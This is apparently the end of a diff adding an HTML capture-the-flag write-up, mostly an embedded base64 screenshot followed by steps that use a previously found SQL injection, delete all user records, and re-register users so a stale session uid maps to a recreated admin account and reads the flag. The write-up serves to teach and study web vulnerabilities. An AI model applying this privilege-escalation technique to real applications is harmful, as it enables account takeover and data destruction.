Zx2Aecj8ziq9JTGEXTNj/yy1eRaL5kuAm7N9E/w4kV00A8zAGY7LKsk00VrzNogPMXnMRpwhNJXZM9BsW5J8ZO0M9tCdk2eFeQf20zrrAM5D/j8xwyC9JQmwXTNh/yy3eZYqwS2Bfkxugh8ntItmQBk464wrZsyYMWuSjxvjqHtDm2hi3qzDGULDzJ5VG5P/NmTryn0ctNNSK8x7s/20zjrA85D9nUF6SzJgu2Zs/yy3eRYPvzKxN3CdiRs0wY8T20UTwAycVcY1gWZ1P2wTjefNOmwrTWX2jOxuLhkLJCxH9rA+LbXAZvogv6/OOsD21NnHJL0lR7jfARO2z6vYrhkjt3m2/RISMM5Z93tgu2gCnIGzxlbmVre61Xzkcrdy1HJsE43nzTpsK01l9ox5DEfg/A76aanl8w5RWAfYnjr7LzFLb8njfHS7ScV2zRAFm2fbEePEdtEEOANnsFn9Ztk00XjerEO20mRmz9iJlY3n2LmHflpq+bxDFNYBnofs70zSW3KE4240YdtE2KRAFGyebUeME9tF46dx3ri6yKaJxvNmHbCVZjN7xmjjQKOOb9ZPSy2fd4jCOoD21Pl/iUV6S+KXyFGweXY9NK7YkMzKS8ybDT8N2krDzJ4ldOsYF6Q9df6/l8civSXVYWye4wPbRecHbCtNZfaMrkZJ7KGfljomWHvq7D8wSW9JbRib5/jAdtEsvxsI2TTRaphM64xtpanMnrEAIxWDyR76aaljgrWnzv7OJL0lw/Akv2rkPMmvKgFm4KyLbJpoHcawkVc59Pl8f2wrTWX2jALkHMrvYtCPpTJJrD119jFJb0k5cvtnfZrtmjmwXTSRcTPMwFkX2TTROuQ3XEY9in4rbCtNZfaMfJVZZdF8k4onOb6in5ZaF/E6IO2pm22ns/yFLNJbcpTDP3viNp9AbP+sT7NdMwe2iyYybtaeA2cX0E4TbY+QPAzMD9SvwlJe/bTSonP2XOuqPdz3/km/3Ku/BNtSyyHsp8XrAM9Ds+108j9j0Yy9JfHnUhJ/LyW2f1aHsGvG44TjYjJu1p4DZxfQTRNt17rlr0g+5Bpk+wM5wbTSgnP2PGG7/Hvc69XGW5905x39ZGhLrfDvfwm3X/E6wJlGA9vpQuQtqYDU/lkdaNdMgeyiqYybdefA2RU000Tbt26JXeLJoEX24UTnEFp/zp6btz38ZGhLHQLxOoCZRgPb6eKXe+TCD7lUDbvNziqMK3AGzgAyrWmi41YplE8/rbT1c/a8p/t1IzpPtVZle+rZ2aKfe+QaTEaWsV6W3c8vwN6SnZXN27ZtO/F/3c8twd6SnZWP9wnbbb+uSHtLdsUMnF9zw4YNx59z3bH/3pJj/70lhxXekrWWQm/J/rkrUtdNu3c+KFLXTbvP2SuXM2/JjNgrL/zj0Iws5828dG/dunvm/kk585aMqXI1QoEzhMa20ihDaHEuBA+MIKOfrz4iTE+/aRV3ieFmsecDgDmVCEkLdgs3WafGftJ/oxjVeL9/W6d5G82s7HJfyC5zj4ypcjVCgTOERp+1TqT5Jc01cibyfDCSbLSUfoIqLuMSP0eTKqqepyRDVRxlaLwieU54RzJbMUWqZ0B0OpAw9G5+YJfb2WXukWErVyMOcIbQ2FYaIs21Ace/1IuwB9BXz6GZM1AKWSavo5qJecPCvFZky2uoUFVGaGho3rad2OhIVcmch3VLA6Xr8t+U7KnclpsDS3GlHFCwrpt2GDtnRcLjrMAZQmNbaYwsV4Lh8bObjWdPGKqQ8TxLiRUkR1ox1CSHKlmdyyeCsztNY8nSht/g8qrHcSXgyVyqA+5MMvfINCpX415F3vHEyeEMocNQnp6+SoBNuHGmDZupL396GnNksIGqfOoUxHbsdHk/MIBdtG6G0Y1s2rb2BZyjRHlLplG5GsNIC1/AGUKHYQHjdCwxc1w7E7cuuesOIAerqZ7GNVU1cjH7NJZLlPcDA9hFa2cYPcrUXu4fwL2kRHlLplG5GvnWaGfxC1d0P0Ef+aNB2KL/bF4gK9kM8C5a1V5rM1us+UxpzXmCrFrq5/i4VgwfpQE+z/oZRo/Onbv7kY27kuUtmUrlaqTvWEX8hcYModMhB6/RKiY2yIeYDYtwhK2iirAshK4T5Xv+fA/BH2iAz3O4DKMXuc8hXlKovCWTqVwNdJ97I+EXcIbQ0FYaIsjlGlv7yfhcZK540r+8kH95QxVURZcrVy68QV16jlSl2uIBQdwabTXA5zlghtHT67nv5SlS3pIpVK6GyRcm1CUTDyTOEBraSmP0uVwDLR+3cBBJ+hd+XEvL18OsrbkepmdLSA3HGuRqOLbRAJ5nxQyj9X5ZifKWTKtyNeI+OPkvVbjhDKGhrTSBdpppFwHQ99/I7fsCEBtmKMMnnujoaA/v1hBidfCyVqNDMI8G8DwrZBjduvbPJpl7ZEqVq5HwuCL0kyrccIbQ6k+7Tj8+ZABXsCJW8s3zsrLXCmfZA55n/Qyji9x1006ncjX6vrIj2UT8D6nLfVEqzOHndXrTP4211+XJOpkCfJ71M4wucddNO43K1aj1Gn++O/2/cIbQgf8c5j7ckjdQYvK1/f61zvFDn6sKNuC/mbx/2GhNPX27aEmG0S1g/2zGuUemUbkaC1c8TPAKnCF0GI5UzW7Lc5gSV/FP/+BaF3+ZH6bLQmQBRU82VaWygZ6+XbQkw+go7J8LkbdkGpWr8cair4MzhA7Dzrqfw5XXkNP8FCWetOPP1lrryU/7PV0wE3MqEskOTpcnL6+nbxcdLsPo2b/7u21ySpG3ZBqVq/H1on/viTOExrbSRIbQslzj2HGhWFTfgjOLtZ6+0ehXUqYBWQwAQpbjlIZAw6fxbiF6+nbR+hlGj7LZ/RjxZwoVI2/JNCpXQ+ZQCjOEJj6XkkjIWJbrZfORQx9J+m5WwfeDK2zadG/HP1afCI3I5GTyfLAD9PTtovUzjB5ljft0KfOWjL5yNRQ2mCF0KNByrWuQQ8ctVCMHL6Fb/UvB5i0bT8bnXAwC6nbRATKMHmWu329pKfOWjLxyNXS3S9/qzjXsVjV/CDKriqtZM87100WHzTB6q1+1DHpL/ou/b+0r25b7+Z+VMW/JPsd+7usKmbdkj2OB+/wy6C25w4ZVvYV5B+859t9bcuy/t6S5eUsC05qbW7Lb7QL655b83jvdaX6ayOYhj1+opHtLXtH9cxJj6vwJyOYhj7vy7C2ZEzZ9mL91O1CivSVB5WPEzyfN/JewcjbkyG2kswjnvLlce0uesdLdPQH+xd9XWDkbmuzEwEsGzlduKfOWbKp8jNSpdbJ2L0qZt2RT5WOkT+1iFDJvyabKypCwePVmWcbOZVJCgF33lJRmQN1ll+ZMm6n6bYb14SzNrBmiUdkb0KaZOs52eUlJ85Z85yWVRC1j5wguBrQl/wD4Eb8NyrSZqN9mXB/O4syaMdbPKTS2aSaOs/W+l6ds1V0k9UAtY+fpWAbYqpFvBHCc/yvKtJmo32aiPpylmTUDdGyksU0zPs62e1Cm6i5ShlrGzifffByw3kYRMwIP9XNgps24fpuJ+nAWZ9Ysf1o/XTO2aW7ZpwtV3UXK4DJkFk2z3IPDgLrP32AK8OO+P8y0GddvM1EfzuLMmuXop2vGNs3ZoqjWXaQMtYydS7ML+rq3fnJ8Ao73W8FMm1H9NlPV/inOrFmClemaV7m/Y3t9oQLnLSl8mstHVzTNchQD0YH/+BIWw1fPbIGZNiNTVCncOIVQds3AprmVKHHekvrIplkeEJ9vbk5jF+UE3P27UKbNCUDYNUOb5kaGG9dNWx/ZNMtdeM8/8xSuyk2r+7ko0+bY0LGRxjbN7UYh85YMgGya5T9jyoIRQHTOI1U/C2XaDPn0WPl6v0XlbZpbnVKUe2QAZNMs78gdSqwOTJ/Wz78FZ9qM6rc5RoQZOX+APzP973YswLlHBkA2zfLzmIuTgWdyY1+IM20G9dscHB0baWzT3HicLfTLSpm3JFH5GGJk0yxnZSDHADuw7h5EPTij+m2mwJk1yxHbSGObZnycrfLnMIuZtyRR1xNihNMsdyRrAqPIr64402ZUv80UOJFhOVIbacKmGR9nq+zKmLdkEITTLC9IfzrQnzyNyLQZ1G9zHAhtpAmbZnCcrUPx85a8ovvnBK8HZ6J+m3W2sPOgU5kbrbIrY96Sqf0EsQgYGuUe+QaPfvTCNJHNw/Z9eEuO/feWHJvvLdk9v1Bxzj2yk+6Kc+6R2f1CQx1vSZmNcz+zfS5O922N+BMzTM722TbrLvLS5xPEb/scvL6c++lLTLLuIlE9NyPSsH1GdtIK9eEM68+5i+xK1H1bA+u5GZCG7TO0k5bXhzOuP+cALxlieEviem5uJg3bZ2wnLa4PZ6L+nPW/l2eI4S2J67E5JqoS2E5aXB/ORP056z8YYnhL4npsJoje9hnbSUvrw5mpP2fN3XDDWxLXYzNB9LbP2E5aWB/OVP05azLc8JbE9dxMELftM1Xtnrr14bxwb39ktr9Qsb1vaxa4zxJEZ/ssR7c+nBe4t/Blyy1xuUfiem4miM72WY64PpzxcQ1i6i4S13Mz8cuis32WI64PZ1x/zqoMN7wlYT02M0Rn+yxHXh/OqP6cdT9TaADiLfl09yMqA7J9TgF5fTjj+nPW/HOYww9vyXPcz6sUyPY5BeT14Yzrz7ndf1lhyz1yrftZlUNq+xwjavXhvNb9rPb/CWKFLffI73A/tZJIbZ9jRF4fzs3159z6u2KWe2RjPTeTO6Htc5Qo1Yfzxr0DFtz+EMNbEtdzMyZ+22fCTlpcH864/pxlu6GItySuVmRIArbPhHuvtD6ciepKHsJ4S4qR2j6nAarHZoJBjbck9XRyts8K9eE81PGWDPo7ZwQMpbwlZTbO8ds+b9+Kt+TYf2/JMfnekqnvhlHekqkzlPKWNMeXmOR9WyOzd+5n9s8l6r7Pln2iRT/7RIwSdd9nhyUP9s9DGG9JeFcCBrCDTt/+eQjjLYnvSkB9s9P07Z+HMN6S8K4EDED69s9DGG9JeFcCBiB9++chjLckvEsC5bqHLzC2Z2s7poNO0P55COMtie5KQLlRdyRJz6pfp2AHnZz98yDGWxLYN/Mc2/hYZOCQSHLOnRXsoFOzfx7EeEsC+2aa2GRONwkIaUG/nYIddGL2z8MYb0lo3yxUk57qABCX5ocp2EGnZf88kPGWhPbNQltygOFyoavvomAH3TXsn4tz3UU+wz39ZUZzJpP0CmanXdr+uchdN+1rOGfIBHRp++cyd920V3KdTEA69s8DGm9JfFcCyoxlNalPp0jO/nkI4y2J75JAmfWZYTgTzv+6QsEOOjn75yGMtyS+SwJlViRzA0BBn/+Fgh10cvbPgxhvSXhXAsqgGh9ypApv+dV5/cMV7KCjtn8e7HhLwrsSUKheGzK1BMkTq4IddHT2z4Mgb0l0VwJKoeCMRUhWHl6rgh10dPbPQyBvSWTfLAeg6uWzaqeDjtD+eVpKc0tG/jMWh2HeklI7aNdP/7x9M96SY/+9Jcfme0vGvRuKeUv2z5cUp77x00f/exKLVN/46ZsPCmPf+Jk6v28ydX6x6Bs/eb2rArttvTtv+jB/61LRN37yUA/Pszjbar/wyfdCCFEPz0T9O8O7cLAN6t15Dn+aQw2/fwJQt87svN08/ctEXnGcOQWfJzSPzHlUzlw60r+jFUodtM5++8ZPNurheQ0aqlsNUA/PRP07w2q/a4N6d65KJgD96F4CwB1ZEJibQ83+T69o1xnOI3EeZZlLa+frq9RB60y47iLzUA/PazCjevWwzQeS/xygHp6J+neGd+FgG9S7s9fPROBk2TfggxMQxblitbTrjOdR7a4krLVOVm2UOmidAfeNnyzUw7PpWa7ZkHe/gl7dRXKfpY6PqzXq3TmCuYE/LpJnHNCadSFUVb6ODedBY1NHqYPWWbC3ZEL18KxDYbfvHBcZrndn/h4uXx/Ic6sbRQCzMaeYfB1FMOuIsL8OAbLNRvX7bLXekinVw7MGqOLnxUWW691ZZiBfCaRuey+/Fz34TDEL6yiBWEdMh6kLAW2bPbWX+wdYrbdkWvXwrEBzvyRHSHbr3VmkK5fHYG64E/tjBEeIWVhHCcQ6YjpMHcvZt23Yvh+Dba9B/T4brbdkavXwnFnKbr07i/wjZ0Qx9ivOSrgXG4jJ11Hx6YP8vkyHqWP5em/YfgnD214vcp9jtN6SCdbDs3Xq9fAMII8ru/XuLNKZfXBsw0UrsTimU47oc9MToZSHPfTrjOcRngcFkP01y5J7N2wfApHYXk+vt1pvyQTr4dk69Xp4BnDH1Qr17nxPVsHK3K+bymXRiWHm60T20K8znEd8HoSQHaZOe8O9eMOEvSXTq4dn69Tr4RlAHVc71LtzGH2xG7vTQ4I2RtOgEMX5YAGlGrGHfp3RPBLnQQq37oJuz/Cf/GMLvm7a6dXDc2b2za1R784luIdedgDwkOeH8SEQf7N8HeHTiXEN910s+Lppp1cPz5mbtqh35zwMD5wVmLVoSc4qJ13HWFn94w3bdYVjWekPseDcIxOrh+cU/xxmS9S78ya8TtCqQK6Km3OgnHQdg/Ppyr+M7I0bFpx7ZGL18Cxmktt3jo6WqHfnP2Mr5gBGsxfHyonXURmmw9SxPPJODdv+TbC9ccN+vSUTq4dnBUZnircHz3i9O2ty8fnsCezIGbmCnHgdlSE7TJ36hm2zm+v32Wi9JVOqh2chqS1bVq+0nYenVv16eIYQx53feneW6c0BzA2MYhvOpqdfZzyPCucBryPQYepCwNtmb3Y/xmq9JfNQD89r0FCTQ1R7MoI57vzWu7NMfXrYH2hNNxcDrN4vJZ5HhfOA1xHuMHXqG2+bvcZ92mi9JVOph2cdGpX6s5ciRvJb784ye+hU3sHal/TEWUfMoz64w9Spb7xt9ly/31Kj9ZaMvR6eo9tasN6dE980MpoOa3u91a9q096S/+LvW61o23I//zOz9ZY0M/ZzX2e03pKGxgL3+TbtLbnDhlVmxLyD9xz77y05BsNbchjpLdkzdwFU+05k/hgA5R7Z3R8U1b4TaV520CbsLWlYdtCXnvA7vQV7S9qTHTTMYNqE7/tse7KDxhlMm/B9n21OdtBEBtMGfN9n25MdNJHBtAHnHmlOdtBMBtPNdtA2m3ukOdlBUxlMN9tBG623pDHZQXMZTAM7aJv1lrQmO2hRBtOL3OfYrLekQdlBSzKYnl5vtt6S5mQHTWQwbcHekvZkB40zmLZfb0nTsoN+uvsRRnzdtO3KDvoc9/Os+Lpp25MddGMG02ace6Q92UHLMpi2WW9Ji7KDxhlMN9tBG623pEHZQfMZTG92P8ZqvSWtyQ5akjDyGvdpk/WWtA876KiY6/dbarPektZhBx3XttWvarbekqZmB2203pLGZgdttt6SpmYHbbbekpZmBz3231ty7L+3ZE/wlrQFSoW3pH09bcK5R/ZbClHf+LEFO+hi0Td+7CvDZwP2ljQoO2hwFxTacN/4MSg7aHAXFJpw3/ixJjtoorI6bLhv/BiUHTS4Cwpt+L6tMSg7aHwXFDbbQdts7pFWZQf9zktqA8120FbrLWlYdtAjD4AdtNF6S9qPHbScZjtom/WWtCA7aD3q9Hqz9Za0HztoIUbsLWkddtDBMWJvyd5tB50aJnzdtC3IDlr4wIavm7YB2UGr7sw290j7sYPWxWS9JU3IDloItIO2WW9Ji7KD5u+Cws3ux1itt6Q92UHz9/jfGvdpm/WWNA876KiY6/dbarXekqZmB2223pKmZgdttt6SpmYHbbbekqZmB2223pKWZgc99t9bcuy/t2RP8JbstzVRU4T6TmQ33hXfvhPZhX9ZCe47kd3XDroA951I8+oAdUbsLdk9O0Bdee47kV20A9QV574T2fM6QF056xs/9tUB6iz4umlbVweos+HcI02tA9SZrbekcXWAOiP2ljSuDlBnxN6SxtUB6mzYW9K6OkCdEXtLGlcHqDNib0lT6wB1VnvdtG2tA9QZ7XXTNrYOUGe2uUfaWgeos1lvSWvrAHVW6y1pah2gzmy9JU2tA9SZrbekqXWAOqv1lrS1DlBn096S/+Lva0m2zXbrLdnb2M99XTHzluxtLHCfX8q8JfubHfS8g/cc++8t+WP+zy15abe5JWsdynlLWtfu0sHnPbJ38Xbfd3RXYvnh6ZfiPJ/8wsYtGfWW7FV20FNn7e436Up0YollYy/hP59MnZ+9dZFPb8mMZr5csr9Ay9pAv93x7vc7qSvR1UfmSs/cLPzjzKyTTR/mb529dZFNb8k82EEH+01qsOHfU3MnxTP8vaxPD43snSk7aPVxEscNbKCT/ivDIt/7qefXroEgc+iwjeOZs7tYT//QnXVV1Pmgv4HBJn7/Ik6yabRb+NsY/jEgzqzFdtrofUGvk3kzMy+Vaz16ZuZ05XmOsbdzEPMgP66gHdeOHUfzushl3/jJgx10BZqUYhANo0P9HltYnx4a2jszdtDq4ySOG9lAJ8zvua+otQug9xlYa5JzitUja5g8yJDhNc6QaDKpu+kj1skfZx2ve/i+YNfJpPuptT7K/YnK8xxfb+eg5kF+XPq/rzQeJzvO5nWRx77xkws7aK+jsd7k/R2/klfl5hAD69NDY3tnwg5afZzEcUMb6HSfu5fvdIVuRUgpVkkXxwvkWNVkVobq8nzIAC5uC2ynDd8X7DrZ4tspL5zj/lsJUetkxVDzID+uoLDjBOsik33jJxk7aIWtPhlu9ifhVryGVyWfHpq3d27++ThhxomPG9tAJ8sRfv1L124FFvNYeOXomWxinC3kJ02G2pr3v7m2LfC6x+8Ldp385HZjOsF/ssaI5kbNg8JxBYUdJ1gXmbxu2unYQWuzXieuppJPD83bOzejPU4WbAMdeYbPEg7z28QxTtjrN6jewQHvQkI0DgXM+oobc4K8Qoxgb+KA84yPQ9JR7GJr7/iP5WIFTzdZ5tBteC+xMfQp35Hg488ZlOU67364oEvg9wW3Tmp9tdHX1Ho3v1/yHdWOmAcIcVwxdFw7yTgP9a+Httu5yj0yJTtoXbo8ndup5NNDC+ydG9EeJw20gY4+w2eeX/dbRDJO3Os3iN7Bge9CQjQOBYx9ZY8gyXm9+r2JA88zPg7pjmKHY5sMksyoQ5w3UebQm7CWlcmwCxhmBGmpiqvI+tNYzpXgCqPvC9k6qfXT/exaP86PzUBHtYPzQACPK4aOa4fHCdcFsN3Ok7dkanbQmizc35MRp5BPDy2wd25EfZwUjEFVghk+j45oRSzjhL1+g+gdHMRdSIjGoUetNlvPnkwuKdibOPA84eMQ7ih2xzZBfMhaaz2EQRuJeZRkDp2DVSCu5upUMWtyIlSrMSkkfShruMoV3U+QrZNad/e/qvVJ/rAMdFQ7OA8E8Lhi6Lh2eJx4XQDb7Tx5SyZnB22fUhjH3sqRUj49tMDeGaA8TiXiz/CZZm9/aCzjxL1+A/cODuIuJITrSAv/0jvrQPpkMli/N3HgecLHIdtR7MJ8/OAUB+QbwgOW4nmUZA7dgH65Yeyjvkm/vMFYNgZycrQrNL4vBOuk1jlb19X6Flt/PQcd1Q7NAwM6rhg6rh0eJ78uFrnPyZW3ZHp20Hb5N/wj/1thfXpobO+MUR2nEkll+Iz+FfsjYxkn7vUbuHdwEHchIVxHWrAmAORrxM76vYkDzxM+DtmOYpebSYUBoHB7PxzPoyRz6HUZL9eb/r5A96FMMdieKwPLcno7YHtt9L5oXifMeclER7VT3eLsuHaCdTG9Pk/ekknaQdslD7L6Gg12HimtTw+N7Z0xuuPUIX77ZwmxjBP3+g3cOziIe8oKriMtfCGGGdl20u9NHHie8HHIdhS7QVxaTfRvvg3PI8oc2jbBbi4KTGMZ30xVOIiJwFMYFGX79TBvUuH7QkgeOqqdLmE6rp0yWfSWTNEO2j74Zf6j80hpfXpoaO9MoDtOHSK3fxYS0zjv4w9rME3FvYODAK4jOZq+fo8ny/q+8Dzh45DtKHYzs4sqpz8GzyPKi9c2+D1OBp7OWxlilGH77kB6Ni5lA5yJNH5fyMhDR7XTJUDHtdMnk96S6dlB26gOr49nsIV8emjW3plBe5waRG//LCKWcWJQ7+CgAOsoBPq+8Dzj45DtKHazm2DmMRQrcXpgC0422JRl0x21IDd1wTfj94WMGDqqXWoE6bh22rssXjftFO2gbZRwTuiZ2oct5NNDs/bOBOrj1CBZ++cD/exQ45SDegcHBVxH+uj3Jg48z/g49DuKnSv14ngLytA/yZth8jZpJxpqORfA74umdcIQQ0e1S43YO67dWn9WJq+bdnJ20HbC7Bz0fLaQTw/N2jtDAowTw9hAJ2v//Hn+8aHGqcMc/2rJOx122DotUk3o9yYOPM/4OGQ7it1P8vmqsn4nIZ9ubiCntyAqiAVqslGYYWI5DysOdVRFeipItTM+/S5RMPh90bROGGLsqHaxE3vHtTvNd8pk7pGJ2UErU4AT52UL+fTQtL0zIMQ4CQgb6GTtn7/YX195nIqg3sHB8iS/qjqeMENfW+r3Jg48z/g4RDuKHf6RzVVT/DuakWYOvRwvAws1PUeswXEmUxg2SlDWJRuPbWSKG/4Hkvb3+F9j8PuiaZ0wxNhR7WIn9o5rd0/fIZPekknZQavjfSRLsYV8emja3hkQYpwEhA10/Bk+05zg3/rcQOOU71Dv4KCA4xjlzjv93VwBhmuzVPUwUb83ceB5wsch21HsajMor1PeIL98M8LMoQv7uJkVozldLo4w+Ele33iZ8DYy9Q39XI7+IRj8vmhcJwQRdlS7KJCtozg7rh1eF82227nylsyDHbTXEfgPyJSYmBivGWxKN1tYnx4a2zs3E2KcDNgGOv4Mn2lmd/TDAo1TDuodHBTcOGqty9y/XkKJdsXg3fz6rJig35s48Dzh45DtKHbeCM7UAag/kY+eIuAzh34mh+6hW1GARabwKQaVje/WXpNFZdNod6/GorWBVdrw1r+F1z1+XzSuEy3gecXzHkFv5xAjW0dxdlw7fl1sdj8mV96SCdpBW76fSFPFSLawPj00tnduJsQ4GbANdAIZPtPbo9xXhxmnHNQ7OKi/F4LjGGWj+ykSfuPPPIFppLu3YG/iwPOE5022o9ghtB2ZlERWWcz82xE6c+gUshWs2FlvRE/7dNVUsobxKtisKpq1GLn95CM7kkEvocS6h+8LsE4wiXZUOynCdRRnx7Xj18Ua9+lceUsmYgcdCkxxsD49NGHvHJL6vxzQBjr+DJ8Fc3WmP2vdVIBxKgB6BwcHvY5Ocr+0hPFxfx1PT7W5JXsTB54neBzSHcUOMbePIANzhVL//pjMHDq27Xg+MhiWahzZGKoJ9BkuKoqbi8vIoFATN+nefpVKgN4XeJ0gIuyodhEgXUdxdlw7fl3M9fstzZO3ZOoZPrt+euj0bKATz/D59nu532Sz9jg1t9N3Xqy9jt7Dz6wSmgLNOozU96VfJ+V5L1jQznMOvdDvkXVDkWlVwiqrhFn/cyFbJ7XWmoeOateMfB1F13HthOtiq181x96Sqksh6ueWe1Z+xuJr+7+KSM78H8OPC1fIQj6f5GUdJbcuCNvtXHlL9iqAObb76HwQ5eG7nyyZ5Y958W8210le1lHa62I/93XZ8pbsVwC/lQ8WJxfPkvmtjK6TvKyjtE/HAvf5ufKW1LCDtootqnXrEAs2bzitn62j5G23x/57S27/o7fkoId8eksOe3aZ9JbspNUvX6Jzj8zrDro6dyKnzh/I9Z3IwU+Gz1n0luyiGT4X6L7x00EzfC7RfeOne2b4XKL7xo9xZfhsxNdNu99l+FzKco8cFGX4nClvycFPhs959JYc+mT4nElvyYFPhs9Z9JYc/GT4nElvyYFPhs9Z9JY0tgyfzfa6aZtahs9We920+12Gz6Us98iBUYbPufKWHBZl+Jwnb8mBUYbP2fKWHBRl+Jwtb8lBUYbP2fKWHBRl+Jwrb8lBUYbP+fKW7HUZPhczb8lel+FzGfOW7HkZPo/995Yc++8taW7ekrUO47wlO99/6VIp95ZMq4PTtWNHqSvp3pJXdP+cxJg6fwKyeRiK9Y2fsLbR7UCJ9pYE9cvMkFrmyBoEzRS5LEG59pY8Y6W7O0VqmSMrEDYP2kkkpcxbsql+mVOn1snavShl3pJN9cucPrWLUci8JZvql5kj+cyRCWLIFLldPjGjpHlLvvOSSpOBzJEhMWSK3Ol39nvf1pAPMpA5MiSGTJHzTcnzlpSSg8yR0dMhMkWeMF0KnbekjDxkjtxMHJkid/qd2dZdpIw8ZI7cTJhMkScPBc5bUvh0HjJHbiZApsgTiQLnLSkkhsyRYyNIpsiTjWJ23bRlxJA5cmyEyRR5okkxu27aMmLMHDk0YTJFnmyUMm9JGTFmjhyaMJkiT7ZChcxb8iiJMHPk407wTJFb6GcsljJvySPYv8yNJJo5sog4MkWeKIWKmbfkEezO40YSzRxZRByZIk8USpm35FESYebIx53wmSK3DsXPW/KK7p+TZubIsnnQzxS59X4+TjHzltxWntjVuX7GYjnzltw+T3C6N3j0oxeO/feWHIvqLelwGx55S25HDI28JbdbhjXekn6j75HbrAxrvCX9Jr5HQomBlXUweYPvkZM1GFp4S+aiSzc/vuyeh9VEYYuCyFkTUlWzCzjeZ8sGrFYI11IamkF6qKrVieXhMzQmvbUyGBAQwgqXs08oD59hMfoRy2BC1p44NsxOsP9aQYgsHW1AwuuuKwqVx8NnuOo6TCslolRwToY5W5RpPzxDVF2mWKI6UJ95Ymy2KJeHz/BU0GBUC5q5Y4xVYN2S5fLwGZLq0kQZkMnUk8Sq/RLuh+dh1CdmRBtDENTrrurASgZK6OHzEOpBL6UJVBMC4tlqWcKzZWMY9f3gMgSatSesK+fZsjGEAttimNHEVVWx1ovyefg8gPpCjYrIIME1d6nbL+V+eIafAB+La0R91mAYYFkyD5/hqEKqsTXa+Mad81VbQg+fIah0H7EUKGiudcUGUKhUHj7DUowRRxQM1cWa0wopmYfPsFQQUR280Nq5aiiTh88QFT+nAUGNsvA8JTYsTpXQw2cYqlAjASb7lFxV/aNtS+LhM1wlqo8gLUCQKrZ/wp8tG3AWY7NuUqFMKXedm+/AiOz1jbQ1WjdlBhmqBYyIGhtc20Az1aTr9o/J2bIB4cm61xSRgmpPmJsfk3VLwnhgLFGNQJo7tw8lrheo71WDQy2o5qRL1QJGZG/EOKKAqKe8Y3M48XwCUcpGhExRKDm3aE9BiPQKx1gj4Wnq2AAl+q+7N6popQmCap0SgxIZpz2W9TrnI73rhlvQLuFDfoHqLY51EFmnzqUdOFGaBtfrnv/gU6rgxPQeCJA0VHieuuG2QIlv3Dkq1UiLBOWcO7eCElENxjYElGl2LK3aA/iQX3K2xzYCMdQTAtJLCFGm4xjjxokp02p5Ckq8Ur2xdt3SJT1PDErcI15np0r11tbIGE14t3MAIxaa7jWNjLXImXPCdpZLGFH6pgESjMlcs3+3BzAiY4+xRRakCel2lu0udMivmO4VpWphhM/e3YE3XLT/hBHvdlz3mMViIOfuLrzxY/ln+DC4dk+BQKJAqebpHrz5oj0HId7LM06VxDGYELjm9+HNX7d/hw85HKdjE60MRVHyEN56dft/GDEYscIIhJly8lTe/FX7P+iQ33DtdNqrprYoCOH5y3iVsn12EnTIr7n22mIxA7FGQlCt38kLvmjPQ4hyOJ02TbQICe/Th3mMor3qX9Ch7F07HbGS1iJBBf8Ud+Ov1zwxGTbktxxeOxY/WGSM0Z49kTd91f5pFzYcVvwwbayNKAAh7+F5r31J0jnIkN9xFhRtxhhrGbLR+SPcmzddXPPMy7uQIYfXXjv2fR8xqkGou9fw4i/aq/4IGXa5+vDstWrEWNZIhKz1h3gAb/l4zaXz5+BC+Q8Ie9VHiWtDvc7uzfzlv6f/BhX+hTNXg6L9qDCWAYXgdfokL+Vlyvb0U5Jvhgk5cwZ8TcfGYhQEzZ7r9/N8Xv9le/oZl2+GBgEA" alt="img_sqlite" />
+<figcaption aria-hidden="true">img_sqlite</figcaption>
+</figure>
+<p>As we can see, after deleting all the records from the table, the
+<code>id</code> field will start with the value <code>1</code> as the
+table is filled again.</p>
+<p>These are the steps we performed to get the flag:<br />
+- Register 2 different users by exploiting the previously found SQLi
+(they will have respectively id of 2 and 3 in the database). The users
+can be:<br><br />
+- <code>eraser</code> - To erase the database<br />
+- <code>useful</code> - To be used later</p>
+<ul>
+<li>Open 2 browser windows and login as <code>eraser</code> on one and
+as <code>useful</code> on the other</li>
+<li><strong>Important:</strong> Do not visit any of the other pages as
+<code>useful</code> after logging in as it may set its permissions on
+the session making the exploitation impossible</li>
+<li>Now as the <code>eraser</code> user delete all the database users by
+repeating the delete request incrementing the uid from 1 to 3</li>
+<li>The database is now empty</li>
+<li>Now register two dummy users just to fill the first 2 records of the
+users table, these will have the id 1 and 2 respectively on the
+database</li>
+<li>Now call the <code>install.php</code> as this creates the admin
+user. As there are already 2 users, the admin is the user which id=3 on
+the database</li>
+<li>Our <code>useful</code> user has <strong>session uid</strong> = 3
+when we logged in and the session is valid.</li>
+<li>Visit <code>/flag.php</code> with this user</li>
+<li>get_perms() is called with our user’s <strong>session uid</strong> ,
+<code>... WHERE id = 3</code> which is the <strong>admins id on the
+database</strong>, se he receives all of the admins perms</li>
+<li>He has perm <code>read_flag</code> so he receives the flag!</li>
+</ul>
+</body>
+</html>
